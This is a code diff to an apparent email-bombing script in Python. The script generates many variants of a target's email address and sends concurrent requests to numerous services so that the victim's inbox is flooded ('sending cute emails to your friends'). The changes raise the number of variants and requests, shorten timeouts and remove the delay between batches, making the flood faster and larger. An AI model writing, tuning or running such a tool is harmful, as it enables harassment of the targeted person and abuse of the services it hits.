@@ -1,16 +1,16 @@
 import asyncio, aiohttp, time, re, random, string, itertools, os, json, math
 
 # CONFIG ^_^
-size = 500 # threads per iteration
+size = 300 # threads per iteration
 cap = 2000  # thread limit / set to None for unlimited (i do NOT recommend higher than 500)
-timeout_time = 30 # i dont fucking know what to set this to, i used this for testing
+timeout = aiohttp.ClientTimeout(total=15)
 
 # skidded from chatgpt
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
 
-    funnylimit = 3999
+    funnylimit = 5000
 
     for i in range(1, len(username)):
         if len(variants) >= funnylimit:
@@ -26,7 +26,7 @@ def generate_email_variants(email):
             variants.append(variant)
 
     data = list(sorted(dict.fromkeys([variant + "@" + domain for variant in variants])))
-    results = [email] + random.sample(data, k=clamp(math.ceil(math.sqrt(len(data))*10), 1, len(data)))
+    results = [email] + random.sample(data, k=clamp(math.ceil(math.sqrt(len(data))*15), 1, len(data)))
     return results
 
 
@@ -101,7 +101,7 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None
             data=data,
             headers=headers,
             cookies=cookies,
-            timeout=aiohttp.ClientTimeout(total=timeout_time if not testing else 5)
+            timeout=timeout
         ) as resp:
             status = resp.status
             evaluation = "FAILURE" if status >= 400 else "SUCCESS"
@@ -208,12 +208,15 @@ async def main():
             progress = 0
         print("🧵 initializing threads...")
         start = time.time()
-        tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
+        global timeout
+        timeout = aiohttp.ClientTimeout(total=3)
+        queue = [(session, sub, values, name) for sub in variants for name, values in functions.items()]
         print("sending cute emails to your friends")
-        for j in range(0, len(tasks), size):
-            try: await asyncio.gather(*tasks[j:j+size])
+        for j in range(0, len(queue), size):
+            tasks = [asyncio.create_task(fetch(*task)) for task in queue[j:j+size]]
+            try: await asyncio.gather(*tasks)
             except Exception: pass
-            await asyncio.sleep(1)
+            await asyncio.sleep(0)
         with open(os.path.join(directory, "results.txt"), "w", encoding="utf-8") as file:
             file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
         taken = time.time() - start
